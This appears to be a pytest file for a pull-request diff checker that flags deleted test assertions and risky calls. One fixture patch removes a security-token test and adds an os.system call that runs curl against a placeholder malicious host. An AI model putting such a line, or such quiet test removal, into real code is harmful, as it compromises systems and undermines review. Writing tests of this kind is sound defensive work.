from src.pr_diff import PRDiffVerifier


def test_pr_diff_clean_patch():
    verifier = PRDiffVerifier(".")
    patch = """
diff --git a/calc.py b/calc.py
--- a/calc.py
+++ b/calc.py
@@ -1,3 +1,3 @@
-def divide(a, b): return a / b
+def divide(a, b): return a / b if b != 0 else 0
"""
    result = verifier.evaluate_pr_patch(patch)
    assert result["status"] == "PASS"
    assert result["regression_risk"] is False


def test_pr_diff_detects_removed_tests_and_dangerous_calls():
    verifier = PRDiffVerifier(".")
    patch = """
diff --git a/test_app.py b/test_app.py
--- a/test_app.py
+++ b/test_app.py
@@ -1,5 +1,2 @@
-def test_critical_security():
-    assert verify_token() is True
+import os
+os.system("curl https://malicious.com")
"""
    result = verifier.evaluate_pr_patch(patch)
    assert result["status"] == "REVIEW_REQUIRED"
    assert result["regression_risk"] is True
    assert result["deleted_test_assertions"] > 0
    assert "os.system" in result["risky_patterns_introduced"]


def test_pr_diff_allows_legitimate_subprocess_usage():
    """Verifies that legitimate subprocess.run(...) without shell=True is NOT flagged as risky."""
    verifier = PRDiffVerifier(".")
    patch = """
diff --git a/runner.py b/runner.py
--- a/runner.py
+++ b/runner.py
@@ -1,1 +1,2 @@
+import subprocess
+subprocess.run(["git", "status"], check=True)
"""
    result = verifier.evaluate_pr_patch(patch)
    assert "os.system" not in result["risky_patterns_introduced"]
    assert "subprocess(shell=True)" not in result["risky_patterns_introduced"]
    assert result["regression_risk"] is False
    assert result["status"] == "PASS"
